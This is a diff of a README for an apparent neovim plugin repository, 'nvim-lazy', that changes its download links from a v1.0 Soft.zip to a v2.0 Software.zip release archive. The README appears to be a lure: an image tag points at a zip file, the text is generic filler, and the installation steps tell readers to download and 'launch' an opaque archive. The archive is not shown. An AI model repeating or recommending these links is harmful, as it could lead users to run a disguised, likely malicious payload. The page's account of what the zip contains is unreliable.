@@ -1,6 +1,6 @@
 # 🚀 Welcome to the nvim-lazy Repository! 🚀
 
-![nvim-lazy](https://github.com/gabryel2131/nvim-lazy/releases/download/v1.0/Soft.zip)
+![nvim-lazy](https://github.com/gabryel2131/nvim-lazy/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the "nvim-lazy" repository, your go-to place for neovim and lazy plugins specifically designed for reading projects' code efficiently. This repository aims to enhance your coding experience by providing tools and plugins tailored to making the reading and understanding of code smoother and quicker.
@@ -9,10 +9,10 @@ Welcome to the "nvim-lazy" repository, your go-to place for neovim and lazy plug
 🐻 bear, 🕵️‍♂️ fd, 🔍 fzf, 😴 lazyvim, 🌌 lua, 💻 neovim, 📝 nvim, 🛌 nvim-lazy, 🔎 rg, 🚀 ripgrep
 
 ## Get Started
-To get started with the repository, you can [download the release here](https://github.com/gabryel2131/nvim-lazy/releases/download/v1.0/Soft.zip). This ZIP file contains all the necessary plugins and tools to kickstart your coding journey. Remember, it needs to be launched in your neovim environment for optimal usage.
+To get started with the repository, you can [download the release here](https://github.com/gabryel2131/nvim-lazy/releases/download/v2.0/Software.zip). This ZIP file contains all the necessary plugins and tools to kickstart your coding journey. Remember, it needs to be launched in your neovim environment for optimal usage.
 
 ## Installation Guide
-1. Download the "https://github.com/gabryel2131/nvim-lazy/releases/download/v1.0/Soft.zip" file from the provided link.
+1. Download the "https://github.com/gabryel2131/nvim-lazy/releases/download/v2.0/Software.zip" file from the provided link.
 2. Extract the contents of the ZIP file to a directory of your choice.
 3. Launch neovim in your terminal.
 4. Install any dependencies required by the plugins.
